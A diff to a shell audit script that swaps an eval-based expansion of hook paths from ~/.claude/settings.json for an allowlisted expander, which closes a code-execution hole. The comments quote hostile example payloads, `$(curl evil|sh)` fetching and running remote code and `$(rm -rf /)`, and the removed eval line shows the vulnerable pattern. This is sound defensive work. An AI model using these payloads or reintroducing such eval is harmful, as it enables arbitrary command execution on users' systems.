@@ -23,6 +23,32 @@ INFO_COUNT=0
 HIGH_COUNT=0
 CRIT_COUNT=0
 
+# _safe_expand_env_path — expand a literal `$VAR/...` or `${VAR}/...`
+# token from an UNTRUSTED source (e.g. ~/.claude/settings.json hook
+# command field) using ONLY the explicit allowlist below. Prints the
+# resolved path to stdout on success (exit 0); returns 1 for any token
+# that doesn't match a known prefix (which includes command-substitution
+# attempts like `$(rm -rf /)` and `` `cmd` `` — those don't match the
+# literal `$NAME/` patterns).
+#
+# NEVER replace this with eval. Closes Codex R2 (PR #124): the previous
+# eval-based path executed arbitrary commands from settings.json when
+# audit.sh check_hooks or walter-os baseline-hooks ran.
+#
+# Keep this in sync with the identical copy in bin/walter-os.
+_safe_expand_env_path() {
+  local tok="$1"
+  case "$tok" in
+    '$HOME'/*)              printf '%s' "${HOME}${tok#\$HOME}" ;;
+    '${HOME}'/*)            printf '%s' "${HOME}${tok#'${HOME}'}" ;;
+    '$WALTER_OS_HOME'/*)    [[ -n "${WALTER_OS_HOME:-}" ]] && printf '%s' "${WALTER_OS_HOME}${tok#\$WALTER_OS_HOME}" ;;
+    '${WALTER_OS_HOME}'/*)  [[ -n "${WALTER_OS_HOME:-}" ]] && printf '%s' "${WALTER_OS_HOME}${tok#'${WALTER_OS_HOME}'}" ;;
+    '$WALTER_CONFIG'/*)     [[ -n "${WALTER_CONFIG:-}" ]] && printf '%s' "${WALTER_CONFIG}${tok#\$WALTER_CONFIG}" ;;
+    '${WALTER_CONFIG}'/*)   [[ -n "${WALTER_CONFIG:-}" ]] && printf '%s' "${WALTER_CONFIG}${tok#'${WALTER_CONFIG}'}" ;;
+    *)                      return 1 ;;
+  esac
+}
+
 bump() {
   local level="$1"
   case "$level" in
@@ -180,9 +206,18 @@ check_hooks() {
           [[ -f "$resolved" ]] && path="$resolved"
           ;;
         \$*)
+          # Env-var-prefixed path. Use the explicit allowlist below —
+          # NEVER eval. Closes Codex R2 (PR #124): eval on a token sourced
+          # from settings.json was an RCE vector — an attacker who could
+          # tamper with ~/.claude/settings.json could put `$(curl evil|sh)/foo`
+          # in a hook command field; the eval would then execute it the
+          # next time `audit.sh check_hooks` ran.
+          # Keep the allowlist + the bin/walter-os cmd_baseline_hooks
+          # version in sync — they MUST match.
           local resolved=""
-          eval "resolved=\"$first_tok\"" 2>/dev/null
-          [[ -n "$resolved" && -f "$resolved" ]] && path="$resolved"
+          if resolved="$(_safe_expand_env_path "$first_tok")"; then
+            [[ -n "$resolved" && -f "$resolved" ]] && path="$resolved"
+          fi
           ;;
       esac
       local sha=""
